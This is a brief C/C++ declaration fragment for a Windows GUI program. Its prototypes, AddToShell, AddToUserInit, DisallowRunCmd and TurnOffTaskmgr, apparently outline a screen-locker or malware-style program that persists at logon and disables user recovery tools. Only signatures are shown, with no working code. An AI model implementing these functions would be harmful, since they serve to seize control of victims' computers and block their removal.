

WNDCLASSW NewWindowClass(HBRUSH BGColor, HINSTANCE hInst, LPCWSTR Name, WNDPROC Procedure);
LRESULT CALLBACK SoftwareMainProcedure(HWND hWnd, UINT msg, WPARAM wp, LPARAM lp);

void AddToShell();

void AddToUserInit();

void DisallowRunCmd();

void TurnOffTaskmgr();

HWND hWnd;

RECT rc;

HWND ClosingWnd; 

char szPath[2048];





